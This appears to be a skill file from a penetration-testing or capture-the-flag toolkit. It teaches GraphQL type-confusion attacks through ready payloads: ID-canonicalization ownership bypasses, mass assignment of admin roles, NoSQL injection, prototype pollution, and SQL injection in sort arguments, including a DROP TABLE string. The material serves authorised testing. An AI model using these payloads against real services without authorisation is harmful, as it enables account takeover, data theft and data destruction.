# Type confusion — sending values the schema didn't declare

GraphQL validates argument *types* per the schema — `String`, `Int`, `ID`,
input objects. Two attack surfaces arise: (a) **client-side vs server-side
type coercion** differs, and (b) **custom scalars** (`JSON`, `Upload`,
`DateTime`, `Any`) accept shapes the validator can't check. Both let
unexpected data reach the resolver.

---

## 1. Coercion differences — what each layer accepts

The validator runs on the *document* (or variables JSON) before the resolver:

| Declared type | Accepts also | Attack value |
|---|---|---|
| `Int` | `"123"` string (some libs coerce) | huge ints, leading-zero tricks, `1e9` |
| `String` | enum names, sometimes numbers | `"true"`, `"[object Object]"` via JSON |
| `ID` | int *and* string universally | `"1"` vs `1` vs `"01"` — canonicalization bugs |
| `Boolean` | `"true"`/`0`/`1` in some libs | truthy-string confusion |
| `[T]` list | single `T` (spec: singleton→list) | `ids:1` instead of `[1]` — resolver sees list |
| `InputObject` | extra undeclared keys | mass-assignment pass-through (see below) |
| `Enum` | arbitrary string in lax validators | inject into raw ORDER BY (`sort:`) |
| `JSON`/`JSONB` scalar | ANY valid JSON | objects → NoSQLi, prototype pollution |
| `Upload` scalar | multipart file refs | file-upload-graphql.md |

## 2. ID canonicalization — the subtle one

`ID` type is schema-typed string-or-int; resolvers often do `parseInt(id)` or
raw compare. Discriminate:

```graphql
{ user(id:1){id} }        # int literal
{ user(id:"1"){id} }      # string
{ user(id:"01"){id} }     # leading zero — hits id 1 or not?
{ user(id:"1.0"){id} }
{ user(id:"1e2"){id} }    # scientific → 100?
{ user(id:" 1"){id} }     # whitespace
{ user(id:"1 "){id} }
{ user(id:"+1"){id} }
{ user(id:"-1"){id} }
{ user(id:"0x1"){id} }
{ user(id:"1 OR 1=1"){id} }
{ user(id:[1]){id} }      # array where scalar expected — parser strict?
{ user(id:{"v":1}){id} }  # object where scalar expected
```

Findings:

- `"01"` resolves user 1 → canonicalization to int happens — an *alternate
  identifier* for the same object: bypasses naive per-id rate limiting,
  ownership checks keyed on string equality (`req.id === user.id` fails for
  `"01"` vs `1` while `db` resolves the same row!). **This is the classic
  ownership-bypass**: the check compares the *input string* to the *owner
  string* while the DB query canonicalizes — `"01"` fails `===` but matches
  in `WHERE id = 1`.
- `{"v":1}` reaching a `find({id: {"$v":1}})`-style query — NoSQLi tell.
- `"1 OR 1=1"` producing driver text — SQLi tell.

## 3. Extra keys in input objects — pass-through bugs

Schema declares `input: {username, password}`; resolvers doing
`Model.create(args.input)` may accept **undeclared keys**:

```graphql
mutation{ register(input:{username:"x",password:"y",role:"admin",isAdmin:true,
  verified:true, balance:99999}){ id } }
```

Validator responses:

- `Field "role" is not defined by type "RegisterInput"` — strict; move on.
- Accepted → the model got `role:"admin"` — **mass assignment confirmed**
  (`skills/web-mass-assignment/`).
- Accepted silently but ignored → lenient parser, no bug — record negative.

Lax frameworks: graphene's `graphene.InputObjectType` (pre-v3), raw
`args.get("input")` handlers, REST-wraps. Strict: graphql-java, absinthe.

## 4. JSON / custom scalars — the universal object carrier

Fields typed `JSON`, `JSONB`, `Any`, `Object`, `Map` accept raw JSON values:

```graphql
{ search(filter: {"$where":"sleep(1)"}) {id} }
{ update(data: {"__proto__":{"isAdmin":true}}) {ok} }
{ import(doc: {"constructor":{"prototype":{"role":"admin"}}}) {ok} }
{ query(opts: {"$gt":""}) {id} }
```

Consequences by backend:

- **Mongo**: `{"$ne":null}`, `{"$regex":".*"}`, `{"$where":...}` — NoSQLi
  (`skills/web-nosqli/`).
- **Node/JS**: `{"__proto__":{...}}` — prototype pollution
  (`skills/web-prototype-pollution/`).
- **SQL**: `{"col":{"$gt":0}}` rarely — ORM filters sometimes accept object
  operators (`Sequelize where: {id: {$gt:0}}` — older Sequelize used
  `$`-operators!).
- **Python**: `{"__class__":...}` rarely reaches instantiation, but dict-merge
  bugs overwrite config keys.

Variables channel carries JSON scalars natively — the document's `"$f"` arg
receives `{"$ne":null}` without GraphQL string parsing touching it:

```json
{"query":"query($f:JSON){users(filter:$f){name}}",
 "variables":{"f":{"password":{"$ne":null}}}}
```

## 5. Enum injection — the un-parametrizable column

`sortBy`, `order`, `direction` enums get **string-concatenated** into
`ORDER BY` — SQL can't bind identifiers, so every implementation concatenates:

```graphql
{ products(sort: "price") {name} }                 # normal
{ products(sort: "price, (select flag from flags)") {name} }
{ products(sort: "price; DROP TABLE--") {name} }
{ products(sort: "(CASE WHEN 1=1 THEN price ELSE name END)") {name} }
```

If the arg is typed as an *enum*, the validator blocks non-enum values —
then try:

- Type-confusion: send it as a variable typed `String` (if the server doesn't
  re-check declared types on variables — rare).
- Direct-raw fields: `sortRaw`, `orderBy`, `sortExpr` — often a String arg
  beside the enum.
- When the enum *is* declared, enum members themselves injectable — enum
  values are validated against a list; the bypass is the *sibling* arg
  (`direction:DESC` is a normal enum but some impls concatenate `dir` from a
  String arg next to it).

## 6. The "single vs list" coercion

Spec behavior: `[T]` accepts `T` (wraps to `[T]`). Server normalizes `ids:5`
to `[5]`. Resolvers that then do `"5" + ","`-style join / `IN (...)` building
behave differently on singleton input — probe both:

```graphql
{ users(ids:5){id} }        # int where list declared
{ users(ids:[5]){id} }      # proper
{ users(ids:["5' OR 1=1--"]){id} }   # string member
{ users(ids:[5,"x"]){id} }           # mixed types
```

## 7. Null, missing, and NonNull confusion

```graphql
{ user(id:null){id} }        # literal null
{ user(id:){id} }            # missing — parse error or default
{ user(){id} }               # omitted — resolver default path runs!
{ user(id:0){id} }
{ user(id:"null"){id} }      # string "null"
{ user(id:"undefined"){id} }
```

**The omitted-arg path is gold**: `{user(){id}}` makes the resolver use its
*default* — often `find all` or `find first` — a free unauthenticated list
when the IDOR arg was the only check.

## 8. Variables type-declaration games

```json
{"query":"query($id:ID){user(id:$id){id}}",
 "variables":{"id":{"$ne":null}}}
```

The variable declares `ID` but sends an object — strict validators reject;
graphene ≤2 / yoga lax ones pass it through. Always try object-vs-scalar
confusion via variables — the document parser never sees it.

## 9. Ledger notes

Record type-confusion capability separately — it changes what downstream
modules can do:

```bash
python3 tools/state.py $CHAL --hypothesis \
  "JSON scalar accepts objects — NoSQLi surface open on filter arg"
python3 tools/state.py $CHAL --hypothesis \
  "ID canonicalizes '01'→1 — ownership string-compare bypass live"
```
